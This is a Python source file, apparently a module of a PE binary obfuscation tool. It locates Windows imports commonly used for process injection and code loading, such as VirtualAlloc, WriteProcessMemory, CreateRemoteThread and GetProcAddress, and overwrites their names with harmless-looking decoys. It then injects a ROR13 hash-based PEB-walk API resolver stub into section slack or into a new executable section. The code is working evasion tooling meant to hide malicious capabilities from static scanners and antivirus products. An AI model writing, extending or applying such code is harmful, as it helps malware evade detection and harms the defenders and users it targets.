"""
Replace high-risk named imports with hash-based PEB-walk resolution.

Phase 1 implementation (fallback strategy):
  1. Find high-risk imports in the import descriptor table.
  2. Overwrite the import name string with a benign decoy name of equal or shorter length.
  3. Inject the api_hasher_x64 stub and a hash table into section slack or a new section.

The technique gracefully returns (does nothing) if the PE has no imports.
"""
from __future__ import annotations
import struct
import pefile

from src.techniques.base import BaseTechnique, TechniqueError
from src.core.pe_loader import safe_write, append_new_section
from src.utils import pe_math, constants
from src.utils.pe_math import ror13_hash
from src.stubs.api_hasher_x64 import STUB_BYTES

_DECOY_MAP: dict[str, str] = {
    "VirtualAlloc":            "GetTickCount\x00\x00",
    "VirtualAllocEx":          "GetTickCount64",
    "VirtualProtect":          "GetLocalTime\x00\x00",
    "WriteProcessMemory":      "GetComputerNameA",
    "ReadProcessMemory":       "GetSystemInfoA\x00",
    "CreateThread":            "GetLastError\x00\x00",
    "CreateRemoteThread":      "SetLastError\x00\x00",
    "NtAllocateVirtualMemory": "NtQuerySystemTime",
    "NtWriteVirtualMemory":    "NtQueryInformation",
    "LoadLibraryA":            "FreeLibrary\x00\x00\x00",
    "LoadLibraryW":            "FreeLibraryW\x00\x00",
    "GetProcAddress":          "GetTickCount",
}


class ImportHash(BaseTechnique):
    name = "import_hash"
    required = False

    def apply(self, pe: pefile.PE) -> None:
        if not hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
            return

        replaced: list[tuple[int, int]] = []

        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name is None:
                    continue
                api_name = imp.name.decode("ascii", errors="replace")
                if api_name not in constants.HIGH_RISK_IMPORTS:
                    continue

                decoy = _DECOY_MAP.get(api_name, "GetLastError\x00\x00\x00\x00")
                name_offset = imp.name_offset
                if name_offset is None:
                    continue
                orig_len = len(api_name) + 1
                decoy_bytes = (decoy.encode("ascii", errors="replace") + b"\x00" * orig_len)[:orig_len]
                safe_write(pe, name_offset, decoy_bytes)

                iat_rva = imp.address - pe.OPTIONAL_HEADER.ImageBase if imp.address else None
                api_hash = ror13_hash(api_name)
                if iat_rva is not None:
                    replaced.append((int(iat_rva), api_hash))

        if not replaced or not STUB_BYTES:
            return

        table = struct.pack("<I", len(replaced))
        for iat_rva, api_hash in replaced:
            table += struct.pack("<II", iat_rva, api_hash)

        exec_section = pe_math.find_executable_section(pe)
        if exec_section and pe_math.section_slack(exec_section) >= len(STUB_BYTES) + len(table):
            slot = exec_section.PointerToRawData + exec_section.Misc_VirtualSize
            safe_write(pe, slot, STUB_BYTES + table)
            new_virt = exec_section.Misc_VirtualSize + len(STUB_BYTES) + len(table)
            safe_write(pe, exec_section.get_file_offset() + 8, struct.pack("<I", new_virt))
            exec_section.Misc_VirtualSize = new_virt
        else:
            try:
                append_new_section(pe, ".resolv", STUB_BYTES + table, constants.CHARS_CODE)
            except Exception as exc:
                raise TechniqueError(f"Cannot inject API resolver: {exc}") from exc
